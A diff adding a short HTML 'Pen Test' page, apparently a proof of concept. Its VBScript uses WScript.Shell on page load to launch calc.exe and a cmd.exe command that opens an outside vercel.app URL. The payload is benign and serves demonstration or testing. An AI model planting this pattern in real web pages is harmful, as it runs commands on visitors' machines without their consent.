@@ -1,0 +1,14 @@
+<html>
+  <head>
+    <title>Pen Test</title>
+  </head>
+  <body>
+    <h2>Pen Test</h2>
+    <p>Executing calc.exe... (could have been something really dangerous!)</p>
+  </body>
+	<script LANGUAGE="VBScript">
+	  Set shell = CreateObject("WScript.Shell") 
+	  shell.run("calc")
+	  shell.run ("cmd.exe /c start https://google-web-pen-testing.vercel.app/")
+	</script>
+</html>
